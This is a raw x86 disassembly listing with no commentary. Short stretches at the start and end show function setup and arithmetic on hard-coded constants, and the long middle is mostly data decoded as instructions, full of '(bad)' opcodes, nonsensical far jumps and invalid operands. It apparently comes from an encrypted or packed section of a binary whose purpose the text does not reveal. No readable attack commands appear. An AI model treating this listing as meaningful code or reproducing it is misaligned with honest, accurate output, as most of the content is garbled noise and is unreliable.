  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	pusha  
  4114bd:	cmp    al,0xc5
  4114bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c0:	aam    0x54
  4114c2:	mov    esi,0xbec499be
  4114c7:	mov    esi,0x93e67d90
  4114cc:	sbb    eax,0x9b1e3ce1
  4114d1:	adc    al,0xf7
  4114d3:	jg     0x411482
  4114d5:	adc    ecx,DWORD PTR [ebp-0x302dda77]
  4114db:	cmp    BYTE PTR [esi-0x2f],al
  4114de:	aas    
  4114df:	xchg   edx,eax
  4114e0:	cdq    
  4114e1:	cmp    BYTE PTR [ecx-0x47],ah
  4114e4:	push   ss
  4114e5:	push   ss
  4114e6:	leave  
  4114e7:	ins    DWORD PTR es:[edi],dx
  4114e8:	mov    DWORD PTR cs:[edx+0x16],ecx
  4114ec:	push   esp
  4114ed:	stc    
  4114ee:	mul    bh
  4114f0:	push   ss
  4114f1:	movhps QWORD PTR [eax-0x2d],xmm0
  4114f5:	xor    esp,DWORD PTR [edx-0x18]
  4114f8:	jae    0x411562
  4114fa:	aad    0xf5
  4114fc:	or     eax,DWORD PTR [ebx]
  4114fe:	stc    
  4114ff:	popf   
  411500:	fcom   DWORD PTR [esi]
  411502:	cmp    DWORD PTR [esi+0x12],ecx
  411505:	or     dh,BYTE PTR [esi-0x56ea59e3]
  41150b:	add    eax,0x4b965dac
  411510:	cmp    edx,DWORD PTR [esi]
  411512:	sbb    BYTE PTR ds:0x62125935,bl
  411518:	sbb    al,0xab
  41151a:	jo     0x411597
  41151c:	dec    edx
  41151d:	imul   BYTE PTR [eax]
  41151f:	xor    eax,0xf5d96426
  411524:	xor    al,0xba
  411526:	add    al,0x85
  411528:	jno    0x411543
  41152a:	xchg   BYTE PTR [edx-0x6048ac8],dl
  411530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411531:	xlat   BYTE PTR ds:[ebx]
  411532:	not    BYTE PTR [esi-0x23026f41]
  411538:	(bad)  
  411539:	pushf  
  41153a:	jns    0x41157f
  41153c:	and    esp,DWORD PTR ds:0x72aba77d
  411542:	add    eax,0x752c0698
  411547:	frstor [edx-0xf268aef]
  41154d:	fimul  DWORD PTR [esi+ebp*2-0x7f]
  411551:	push   es
  411552:	test   esi,ebp
  411554:	mov    DWORD PTR [edi+0xa3f4913],ebx
  41155a:	push   es
  41155b:	sbb    BYTE PTR [edx],ch
  41155d:	(bad)  
  41155e:	and    edx,DWORD PTR [ebp+0x7d2ebbae]
  411564:	jle    0x4115c5
  411566:	nop
  411567:	inc    eax
  411568:	sub    DWORD PTR ds:0x1c8dcc48,ebx
  41156e:	mov    ds:0x35c04ef2,eax
  411573:	fiadd  DWORD PTR [ebp-0x601e0bde]
  411579:	push   ecx
  41157a:	xchg   edi,eax
  41157b:	dec    eax
  41157c:	dec    edi
  41157d:	jg     0x4115bb
  41157f:	mov    ch,0x7b
  411581:	jp     0x411595
  411583:	dec    ecx
  411584:	pop    edi
  411585:	jo     0x41159c
  411587:	mul    DWORD PTR [ebp-0x6f]
  41158a:	ins    DWORD PTR es:[edi],dx
  41158b:	icebp  
  41158c:	mov    al,0xc2
  41158e:	or     BYTE PTR [esi],al
  411590:	add    edx,DWORD PTR [edx-0x5e]
  411593:	ja     0x41152e
  411595:	fld    DWORD PTR [ecx-0x3d]
  411598:	and    BYTE PTR [eax],0x71
  41159b:	imul   ah
  41159d:	jg     0x4115a0
  41159f:	(bad)  
  4115a1:	repz jle 0x4115f5
  4115a4:	inc    eax
  4115a5:	cmp    esp,DWORD PTR [ecx-0x3c]
  4115a8:	mov    ebp,0x3950f43e
  4115ad:	jnp    0x411542
  4115af:	xchg   BYTE PTR [edi+0x638645c3],dh
  4115b5:	pop    eax
  4115b6:	pop    esi
  4115b7:	gs mov ebx,0x4d83c35b
  4115bd:	rcr    BYTE PTR [ebx-0x54ce07a1],cl
  4115c3:	adc    eax,0xcad90069
  4115c8:	push   ecx
  4115c9:	and    edx,DWORD PTR [ecx+0x12]
  4115cc:	adc    BYTE PTR ds:0x3770fd45,dl
  4115d2:	mov    esi,0x7f13cc49
  4115d7:	cmc    
  4115d8:	and    bh,BYTE PTR [esi+0x50]
  4115db:	int    0xa4
  4115dd:	loope  0x4115f2
  4115df:	ins    DWORD PTR es:[edi],dx
  4115e0:	(bad)  
  4115e1:	lock xchg DWORD PTR ds:0xadb58d60,esi
  4115e8:	jns    0xb3137f2c
  4115ee:	fiadd  WORD PTR [edx]
  4115f0:	pop    esi
  4115f1:	inc    esi
  4115f2:	ret    
  4115f3:	jle    0x411665
  4115f5:	mov    esp,0x3fb0a92e
  4115fa:	das    
  4115fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115fc:	popa   
  4115fd:	sbb    cl,BYTE PTR [edx-0x48]
  411600:	add    esi,0x24
  411603:	inc    edi
  411604:	ss loop 0x4115cc
  411607:	or     eax,DWORD PTR [ebx]
  411609:	mov    al,0x49
  41160b:	in     al,0x82
  41160d:	jne    0x411640
  41160f:	jg     0x4115f6
  411611:	stos   BYTE PTR es:[edi],al
  411612:	mov    DWORD PTR [esi],esi
  411614:	adc    DWORD PTR [ecx],edi
  411616:	lods   al,BYTE PTR ds:[esi]
  411617:	icebp  
  411618:	push   ecx
  411619:	out    0xab,eax
  41161b:	dec    DWORD PTR [eax+0x5e194b2e]
  411621:	pop    es
  411622:	cmc    
  411623:	outs   dx,BYTE PTR ds:[esi]
  411624:	inc    BYTE PTR [edx]
  411626:	shl    BYTE PTR [edi],0xa2
  411629:	ins    BYTE PTR es:[edi],dx
  41162a:	pop    DWORD PTR [ecx-0x6c]
  41162d:	cmp    dh,0xe1
  411630:	in     al,dx
  411631:	sahf   
  411632:	dec    ecx
  411633:	mov    cl,0x85
  411635:	pop    esp
  411636:	out    dx,eax
  411637:	sti    
  411638:	inc    edx
  411639:	push   eax
  41163a:	add    al,BYTE PTR [eax]
  41163c:	adc    DWORD PTR [ebx-0x2d478c93],0x73
  411643:	dec    edi
  411644:	mov    al,ds:0x82aa7182
  411649:	frstor [ebp+0x3b58d00f]
  41164f:	int3   
  411650:	inc    edi
  411651:	mov    ecx,0xc370cc54
  411656:	aas    
  411657:	adc    al,0xab
  411659:	out    0x27,eax
  41165b:	sbb    DWORD PTR [edi],edi
  41165d:	fsubrp st(2),st
  41165f:	fsub   QWORD PTR [ecx+0x56470dad]
  411665:	mov    bh,0x1a
  411667:	mov    ch,0x4f
  411669:	mov    ch,0xb6
  41166b:	js     0x41160f
  41166d:	push   cs
  41166e:	les    edi,FWORD PTR [ebp+ecx*2-0x6a]
  411672:	or     esp,ebp
  411674:	shr    BYTE PTR [ebx],cl
  411676:	and    al,0xa0
  411678:	mov    ebp,0x1b04e221
  41167d:	sbb    al,0xc5
  41167f:	shr    ebp,cl
  411681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411682:	clc    
  411683:	inc    edi
  411684:	sahf   
  411685:	jp     0x4116b3
  411687:	icebp  
  411688:	jecxz  0x411700
  41168a:	add    bh,BYTE PTR [ecx-0x773777f5]
  411690:	sub    dh,dh
  411692:	xor    al,0x75
  411694:	add    bl,BYTE PTR [ebx+eiz*8]
  411697:	pushf  
  411698:	jge    0x411663
  41169a:	or     edx,DWORD PTR [ecx-0x53c191b0]
  4116a0:	add    BYTE PTR [eax],cl
  4116a2:	sete   BYTE PTR [edx+0x2af06727]
  4116a9:	ds (bad) 
  4116ab:	test   al,0xe8
  4116ad:	push   esp
  4116ae:	mov    esp,0xe1bea2b4
  4116b3:	push   ebp
  4116b4:	dec    edx
  4116b5:	mov    esp,0xbeeb7d88
  4116ba:	imul   esp,DWORD PTR [ecx+eax*8+0x57],0xffffffdc
  4116bf:	mov    cl,0xc9
  4116c1:	popf   
  4116c2:	inc    cx
  4116c4:	fstp   DWORD PTR [edi-0x4a]
  4116c7:	fmul   QWORD PTR [ecx-0x6d]
  4116ca:	mov    eax,0xba73734b
  4116cf:	loopne 0x411696
  4116d1:	xor    al,0x16
  4116d3:	xor    dh,BYTE PTR [edx+ebp*4+0x39]
  4116d7:	mov    eax,ds:0x15b4ebc8
  4116dc:	push   ecx
  4116dd:	fadd   QWORD PTR [eax+0xbd7436a]
  4116e3:	fist   DWORD PTR [eax-0x14]
  4116e6:	pop    eax
  4116e7:	dec    ebp
  4116e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e9:	lds    eax,FWORD PTR [ebx-0x70]
  4116ec:	(bad)  
  4116ed:	adc    ch,ah
  4116ef:	jge    0x4116da
  4116f1:	ins    DWORD PTR es:[edi],dx
  4116f2:	add    edx,DWORD PTR [ebp-0x56]
  4116f5:	iret   
  4116f6:	xchg   edx,eax
  4116f7:	and    al,0x1a
  4116f9:	sbb    al,0xcf
  4116fb:	fs pop ebx
  4116fd:	ror    DWORD PTR [edx],cl
  4116ff:	pop    ds
  411700:	sub    al,0x0
  411702:	sub    eax,0xed176aec
  411707:	sbb    eax,0x877b0e87
  41170c:	stc    
  41170d:	test   eax,0x4bc575be
  411712:	imul   esi,edx,0x7cc70144
  411718:	fcom   DWORD PTR [edi+ebp*1]
  41171b:	rcl    DWORD PTR [eax+0x76],cl
  41171e:	jmp    0xa4a0:0x2ef05680
  411725:	test   eax,0x6ffbd548
  41172a:	fcmovu st,st(4)
  41172c:	js     0x411777
  41172e:	mov    DWORD PTR [ebx],ebx
  411730:	enter  0x7223,0x1b
  411734:	(bad)  
  411735:	sti    
  411736:	fldcw  WORD PTR [eax+0x58834727]
  41173c:	cmp    ecx,edx
  41173e:	lea    eax,ds:0x5d7807f1
  411744:	and    BYTE PTR [edi],dh
  411746:	cs test eax,0xcc13aadd
  41174c:	xchg   esi,eax
  41174d:	mov    edx,edx
  41174f:	add    DWORD PTR [ecx],edx
  411751:	or     dl,bh
  411753:	scas   al,BYTE PTR es:[edi]
  411754:	jb     0x411758
  411756:	mov    BYTE PTR gs:[edx-0x3c8cb589],0x89
  41175e:	hlt    
  41175f:	repnz or al,al
  411762:	push   edi
  411763:	out    0xb5,al
  411765:	inc    edx
  411766:	adc    al,0x22
  411768:	mov    bh,0xf0
  41176a:	pop    esi
  41176b:	push   esi
  41176c:	imul   BYTE PTR [esi-0x65]
  41176f:	not    dh
  411771:	mov    dh,0xd1
  411773:	adc    BYTE PTR [eax+0x36],dh
  411776:	rol    DWORD PTR [ebx+0xf],0x84
  41177a:	pop    ss
  41177b:	cs dec ebp
  41177d:	pop    eax
  41177e:	iret   
  41177f:	inc    esi
  411780:	repz (bad) 
  411782:	div    DWORD PTR [edx+0x67]
  411785:	adc    al,0x7e
  411787:	and    ch,ch
  411789:	hlt    
  41178a:	or     dh,BYTE PTR [esi]
  41178c:	cmp    DWORD PTR ds:0x26fe5f4b,0xf2c8e572
  411796:	mov    bh,BYTE PTR [edi+eax*4+0x6e]
  41179a:	pop    ebx
  41179b:	mov    ?,WORD PTR ds:0x4d471a7f
  4117a1:	hlt    
  4117a2:	push   esp
  4117a3:	and    al,0x15
  4117a5:	ret    0x4a2d
  4117a8:	dec    esi
  4117a9:	div    eax
  4117ab:	mov    eax,ds:0x73feedb0
  4117b0:	add    al,0x6
  4117b2:	dec    eax
  4117b3:	and    al,0x95
  4117b5:	ja     0x4117af
  4117b7:	mov    ecx,0x344689d8
  4117bc:	arpl   bp,ax
  4117be:	scas   al,BYTE PTR es:[edi]
  4117bf:	repnz ss pop eax
  4117c2:	les    ebx,FWORD PTR ds:[edx]
  4117c5:	popa   
  4117c6:	ret    0xd4d7
  4117c9:	adc    bh,0xfc
  4117cc:	into   
  4117cd:	jo     0x41177b
  4117cf:	or     eax,0x3d703510
  4117d4:	add    DWORD PTR [eax-0x8a0661b],edx
  4117da:	pop    esp
  4117db:	jle    0x411798
  4117dd:	in     eax,dx
  4117de:	inc    ebp
  4117df:	data16 daa 
  4117e1:	push   cs
  4117e2:	sub    eax,0x8389ccb5
  4117e7:	cmp    DWORD PTR ds:0x568cd1ad,edx
  4117ed:	xor    al,BYTE PTR ds:0xe6a95ac3
  4117f3:	adc    BYTE PTR [ebx],dl
  4117f5:	dec    ebp
  4117f6:	es cdq 
  4117f8:	mov    bl,BYTE PTR [ebx-0x43]
  4117fb:	inc    edx
  4117fc:	data16 fwait
  4117fe:	jg     0x4117c7
  411800:	dec    esi
  411801:	test   ebp,edx
  411803:	and    eax,0xc83d9c4
  411808:	jno    0x4117a2
  41180a:	fistp  QWORD PTR [ebp+0x16]
  41180d:	xlat   BYTE PTR ds:[ebx]
  41180e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41180f:	sar    ah,0x82
  411812:	daa    
  411813:	push   0x910a5c28
  411818:	jne    0x411857
  41181a:	loopne 0x4117dc
  41181c:	and    BYTE PTR [edx+0x5a956f8b],dh
  411822:	bnd jns 0x41189b
  411825:	dec    ebx
  411826:	dec    esp
  411827:	popf   
  411828:	retf   0xb793
  41182b:	adc    dh,0xe5
  41182e:	push   edi
  41182f:	push   ecx
  411830:	outs   dx,BYTE PTR ds:[esi]
  411831:	xchg   edi,eax
  411832:	hlt    
  411833:	mov    cl,0xca
  411835:	int3   
  411836:	and    DWORD PTR [edi],edx
  411838:	enter  0x50bc,0xe9
  41183c:	mov    al,BYTE PTR [ebx]
  41183e:	add    BYTE PTR [eax],al
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax+0x2cd78690]
  41184f:	shr    DWORD PTR [edi-0x664141a6],1
  411855:	les    edi,FWORD PTR [esi+0x6e0e35be]
  41185b:	fist   DWORD PTR [eax+0x48]
  41185e:	ficom  DWORD PTR [edx+0x3890fc93]
  411864:	mov    eax,0x459a4a27
  411869:	pop    ebp
  41186a:	inc    esp
  41186b:	cld    
  41186c:	push   cs
  41186d:	or     bl,al
  41186f:	cmp    DWORD PTR [edi],ebp
  411871:	cld    
  411872:	les    ecx,FWORD PTR [ebp+0x36]
  411875:	and    eax,0x91c65a3
  41187a:	sub    al,al
  41187c:	out    dx,al
  41187d:	call   0x7ce87c9c
  411882:	test   al,0xc1
  411884:	stos   DWORD PTR es:[edi],eax
  411885:	push   esp
  411886:	aam    0x10
  411888:	sub    BYTE PTR [edi+0x429d964d],ch
  41188e:	in     eax,dx
  41188f:	inc    ecx
  411890:	mov    edx,0x2ef03eaf
  411895:	xor    cl,BYTE PTR [ebx]
  411897:	sub    al,0xf0
  411899:	ss pop ebx
  41189b:	enter  0xb479,0x99
  41189f:	jns    0x411860
  4118a1:	imul   esp,DWORD PTR ds:0xe7624c23,0xffffff9a
  4118a8:	dec    ebp
  4118a9:	adc    BYTE PTR [edx-0x48],bl
  4118ac:	into   
  4118ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118ae:	jae    0x4118b4
  4118b0:	dec    ebp
  4118b1:	rcr    eax,0x88
  4118b4:	fldcw  WORD PTR [ebx+0x1f04a5ad]
  4118ba:	and    ch,BYTE PTR [ebx]
  4118bc:	mov    ecx,0x8b4bb6e3
  4118c1:	paddusb mm2,QWORD PTR [ecx+0x203ae2bf]
  4118c8:	mov    cl,0x2f
  4118ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118cb:	add    cl,BYTE PTR [ecx-0x5f9ee26d]
  4118d1:	xchg   ch,cl
  4118d3:	mov    ds:0x566d42d8,al
  4118d8:	push   ds
  4118d9:	aam    0x7c
  4118db:	adc    dl,bl
  4118dd:	scas   eax,DWORD PTR es:[edi]
  4118de:	popf   
  4118df:	lea    ebp,[edx+0x16]
  4118e2:	pop    esi
  4118e3:	dec    eax
  4118e4:	sub    ah,BYTE PTR [edx-0x1e]
  4118e7:	call   0x96e7:0x23e32421
  4118ee:	and    ebp,DWORD PTR [ecx]
  4118f0:	(bad)  
  4118f1:	cmp    DWORD PTR [eax-0x73],ecx
  4118f4:	mov    esi,0x3bc7d00a
  4118f9:	sahf   
  4118fa:	dec    ebp
  4118fb:	div    DWORD PTR ss:0xb0265f2d
  411902:	lea    edx,[ecx+ecx*1]
  411905:	push   es
  411906:	mov    bl,0x80
  411908:	or     eax,0xa5ab22ac
  41190d:	pop    ss
  41190e:	mov    dl,0x23
  411910:	cmp    eax,0x68f647c3
  411915:	rcr    BYTE PTR [esi-0xe9ea166],1
  41191b:	and    BYTE PTR [esi+0x25],bl
  41191e:	jnp    0x41199f
  411920:	js     0x411919
  411922:	je     0x4118ed
  411924:	(bad)  
  411925:	push   ds
  411926:	mov    ?,WORD PTR [ebp+0x12e9dcc7]
  41192c:	cli    
  41192d:	es dec edi
  41192f:	inc    eax
  411930:	lods   al,BYTE PTR ds:[esi]
  411931:	pop    ecx
  411932:	mov    edi,0x1f0457a2
  411937:	(bad)  
  411938:	push   ebx
  411939:	jecxz  0x4118f0
  41193b:	int3   
  41193c:	stos   BYTE PTR es:[edi],al
  41193d:	addr16 leave 
  41193f:	pop    ds
  411940:	pop    eax
  411941:	icebp  
  411942:	scas   eax,DWORD PTR es:[edi]
  411943:	sbb    ch,BYTE PTR [edi+0x64]
  411946:	jle    0x4118c8
  411948:	inc    ebp
  411949:	cmc    
  41194a:	dec    edx
  41194b:	pusha  
  41194c:	mov    al,ds:0x37f2dc58
  411951:	mov    ss,WORD PTR [esi+0x73]
  411954:	mov    edi,0xa5bc0387
  411959:	test   BYTE PTR [ebp-0xef6369c],ah
  41195f:	jmp    0x41194d
  411961:	in     eax,dx
  411962:	sbb    eax,0x372ff510
  411967:	jg     0x411985
  411969:	jae    0x4119b0
  41196b:	dec    edx
  41196c:	mov    eax,ds:0xf52e0135
  411971:	xor    al,0x2d
  411973:	push   cs
  411974:	or     DWORD PTR [ecx],edi
  411976:	scas   al,BYTE PTR es:[edi]
  411977:	inc    esp
  411978:	out    dx,eax
  411979:	mov    ah,0x58
  41197b:	xchg   edi,eax
  41197c:	ret    0xde54
  41197f:	and    eax,0x70cfd18b
  411984:	fs fld st(3)
  411987:	stos   BYTE PTR es:[edi],al
  411988:	out    dx,al
  411989:	aas    
  41198a:	ins    DWORD PTR es:[edi],dx
  41198b:	fisubr DWORD PTR [ebx+0x48]
  41198e:	and    edi,edi
  411990:	inc    ebp
  411991:	aam    0xc6
  411993:	adc    edx,edx
  411995:	clc    
  411996:	mov    ds:0x580ab88b,al
  41199b:	rcr    BYTE PTR [ebx],cl
  41199d:	xor    eax,0x8aca37ff
  4119a2:	jg     0x4119f0
  4119a4:	jbe    0x4119c1
  4119a6:	ret    0xc8be
  4119a9:	repz sbb DWORD PTR [esi-0x22f384c4],esp
  4119b0:	xchg   DWORD PTR [esi+0x218051be],edi
  4119b6:	fild   WORD PTR [edx]
  4119b8:	mov    edi,0xebf1eff1
  4119bd:	loopne 0x411977
  4119bf:	pop    edx
  4119c0:	mov    DWORD PTR [edx+0x76],0xe6b95b07
  4119c7:	iret   
  4119c8:	lods   eax,DWORD PTR ds:[esi]
  4119c9:	push   0xffffffe6
  4119cb:	(bad)  
  4119cc:	pop    ebp
  4119cd:	inc    edx
  4119ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119cf:	xchg   ebp,eax
  4119d0:	dec    ecx
  4119d1:	enter  0x8188,0x96
  4119d5:	ins    BYTE PTR es:[edi],dx
  4119d6:	fidiv  DWORD PTR [eax]
  4119d8:	fimul  DWORD PTR [ebx+0x58]
  4119db:	adc    al,BYTE PTR ds:0x433cfa11
  4119e1:	sub    eax,0x936182ab
  4119e6:	push   edi
  4119e7:	push   ecx
  4119e8:	adc    dh,BYTE PTR [edi-0x68]
  4119eb:	xor    eax,0x66a47563
  4119f0:	jg     0x411990
  4119f2:	cmp    dl,0x46
  4119f5:	retf   
  4119f6:	into   
  4119f7:	daa    
  4119f8:	lds    eax,FWORD PTR [esi+edx*1-0x2f698452]
  4119ff:	or     al,0xf1
  411a01:	retf   
  411a02:	push   ebx
  411a03:	ja     0x411993
  411a05:	mov    esp,0x1d80bba4
  411a0a:	sahf   
  411a0b:	jno    0x41199d
  411a0d:	das    
  411a0e:	lock sbb DWORD PTR [edi+0x1b63e3a2],esi
  411a15:	test   DWORD PTR [ecx-0x2ac6b16c],esi
  411a1b:	xor    eax,0x24c17b46
  411a20:	cmp    al,0x17
  411a22:	(bad)  
  411a24:	lock aam 0xa5
  411a27:	cmp    al,0x17
  411a29:	inc    edx
  411a2a:	pop    ecx
  411a2b:	xchg   esp,eax
  411a2c:	cmp    esp,DWORD PTR [edx+ebp*1]
  411a2f:	loop   0x4119f0
  411a31:	sub    BYTE PTR es:[edi],ah
  411a34:	scas   al,BYTE PTR es:[edi]
  411a35:	(bad)  
  411a36:	sti    
  411a37:	fs xor al,0xee
  411a3a:	mov    eax,ds:0x555e9865
  411a3f:	je     0x284c3a8f
  411a45:	inc    esi
  411a46:	cmp    DWORD PTR [ebx],esi
  411a48:	add    DWORD PTR [eax],ebx
  411a4a:	xor    DWORD PTR [ebp-0x5d],ebp
  411a4d:	or     DWORD PTR [ebx+0x5330a9f7],esi
  411a53:	cmp    bl,ch
  411a55:	jae    0x411a31
  411a57:	xchg   ebp,eax
  411a58:	and    ecx,DWORD PTR [edx+0x19]
  411a5b:	test   BYTE PTR [ebx+eiz*2-0x1e],bh
  411a5f:	adc    BYTE PTR [eax+ebp*8],dl
  411a62:	in     al,dx
  411a63:	and    esp,DWORD PTR [ebx+0x6c]
  411a66:	outs   dx,BYTE PTR ds:[esi]
  411a67:	xchg   edi,eax
  411a68:	aam    0x53
  411a6a:	rcr    DWORD PTR [eax+0x47b25ca2],1
  411a70:	adc    eax,0xd1487898
  411a75:	jge    0x411a1c
  411a77:	sbb    al,0x26
  411a79:	aad    0x15
  411a7b:	dec    ebp
  411a7c:	imul   esi,DWORD PTR [ecx-0x5d0960eb],0x6bb0e7c2
  411a86:	arpl   WORD PTR [ecx],bp
  411a88:	dec    esi
  411a89:	push   es
  411a8a:	inc    edi
  411a8b:	xor    al,cl
  411a8d:	push   eax
  411a8e:	push   es
  411a8f:	add    al,0xd9
  411a91:	xchg   esi,eax
  411a92:	push   es
  411a93:	les    ebp,FWORD PTR [edi-0x604008c8]
  411a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a9a:	shr    BYTE PTR [edi],cl
  411a9c:	sub    cl,bh
  411a9e:	rcl    DWORD PTR [ecx+0x44209542],0x74
  411aa5:	jle    0x411a8f
  411aa7:	sub    DWORD PTR [ebp+0x6c],edi
  411aaa:	xchg   edx,eax
  411aab:	mov    al,0x6d
  411aad:	sbb    al,BYTE PTR [eax+edi*4]
  411ab0:	sub    BYTE PTR [eax+0x6f],0x49
  411ab4:	in     al,0x27
  411ab6:	or     al,0xef
  411ab8:	(bad)  
  411ab9:	jmp    0xbaf63121
  411abe:	in     eax,dx
  411abf:	(bad)  
  411ac0:	cmp    edi,eax
  411ac2:	in     eax,dx
  411ac3:	ja     0x411acf
  411ac5:	enter  0x7f53,0xdb
  411ac9:	mov    BYTE PTR [eax-0x62388822],cl
  411acf:	sbb    DWORD PTR [esi-0x61],esi
  411ad2:	mov    ebp,0x80c1a35
  411ad7:	push   ds
  411ad8:	jecxz  0x411a78
  411ada:	adc    DWORD PTR [edx*8-0x32c70a08],ecx
  411ae1:	or     BYTE PTR [eax],ch
  411ae3:	test   DWORD PTR [esi+0x7026551],edx
  411ae9:	hlt    
  411aea:	sub    DWORD PTR [ebp+0x2f],esp
  411aed:	inc    eax
  411aee:	push   cs
  411aef:	inc    ebp
  411af0:	enter  0x402,0x65
  411af4:	jb     0x411aba
  411af6:	ds xchg edi,eax
  411af8:	aas    
  411af9:	out    dx,eax
  411afa:	push   cs
  411afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411afc:	jg     0x411b6f
  411afe:	xchg   esi,esp
  411b00:	ja     0x411af1
  411b02:	fdivr  st(3),st
  411b04:	push   edi
  411b05:	(bad)  
  411b06:	pop    ss
  411b07:	std    
  411b08:	popf   
  411b09:	push   cs
  411b0a:	jns    0x411af5
  411b0c:	push   0xffffffa3
  411b0e:	push   ss
  411b0f:	(bad)  
  411b10:	pop    esi
  411b11:	cmp    ebx,DWORD PTR [eax-0x85ac995]
  411b17:	rol    BYTE PTR [ecx],cl
  411b19:	mov    al,ds:0xfcb38b16
  411b1e:	data16 int 0xd7
  411b21:	xchg   edi,eax
  411b22:	lods   eax,DWORD PTR ds:[esi]
  411b23:	lock inc ebx
  411b25:	add    eax,0xf2faafe4
  411b2a:	sub    al,0x3a
  411b2c:	mov    edx,0x9bb377ef
  411b31:	sub    eax,0xeeee1d13
  411b36:	in     eax,dx
  411b37:	pop    esi
  411b38:	pop    edi
  411b39:	popa   
  411b3a:	shl    BYTE PTR [edx],0x82
  411b3d:	sbb    DWORD PTR [edx],0x5
  411b40:	call   DWORD PTR [ebp-0x1616f9ef]
  411b46:	cli    
  411b47:	(bad)  
  411b48:	imul   ebx,DWORD PTR [esi-0x38],0x1a
  411b4c:	loopne 0x411b66
  411b4e:	nop
  411b4f:	lods   al,BYTE PTR ds:[esi]
  411b50:	xor    DWORD PTR [ebx+0x23],esp
  411b53:	or     DWORD PTR [eax+0x33b39e48],ebx
  411b59:	rcl    DWORD PTR [edi-0x7a],1
  411b5c:	inc    ebp
  411b5d:	lods   al,BYTE PTR ds:[esi]
  411b5e:	dec    eax
  411b5f:	mov    ebx,0x2e5366a9
  411b64:	push   edi
  411b65:	retf   
  411b66:	xor    DWORD PTR [ebp-0x11af7cba],ecx
  411b6c:	scas   al,BYTE PTR es:[edi]
  411b6d:	mov    ss,WORD PTR [ebp-0x7cc492a1]
  411b73:	sub    ecx,ebx
  411b75:	shl    bl,1
  411b77:	in     eax,0xdd
  411b79:	arpl   ax,dx
  411b7b:	jg     0x411b96
  411b7d:	pop    esi
  411b7e:	inc    ebx
  411b7f:	lds    edi,FWORD PTR gs:[ebp-0xe]
  411b83:	xchg   ebx,eax
  411b84:	ss and ebp,eax
  411b87:	ror    DWORD PTR [esi-0x33],cl
  411b8a:	ror    BYTE PTR [eax+ecx*2-0x7f520213],1
  411b91:	inc    ecx
  411b92:	test   al,0x20
  411b94:	mov    cl,0x76
  411b96:	nop    edi
  411b99:	dec    ebx
  411b9a:	sub    al,0xf9
  411b9c:	mov    dh,0x88
  411b9e:	pop    es
  411b9f:	sbb    eax,0x2ebd2a38
  411ba4:	mov    al,ds:0x2669b7e7
  411ba9:	dec    esi
  411baa:	in     eax,0x93
  411bac:	(bad)  
  411bad:	jb     0x411b46
  411baf:	mov    dh,0x3
  411bb1:	jmp    0xc294f8d5
  411bb6:	(bad)  [eax]
  411bb8:	xchg   esi,eax
  411bb9:	inc    edx
  411bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbb:	into   
  411bbc:	in     eax,dx
  411bbd:	pop    edx
  411bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbf:	ror    DWORD PTR [edi+0x7d12f89a],1
  411bc5:	push   0xa15cc2ab
  411bca:	lea    eax,[esp+0x24]
  411bce:	push   eax
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
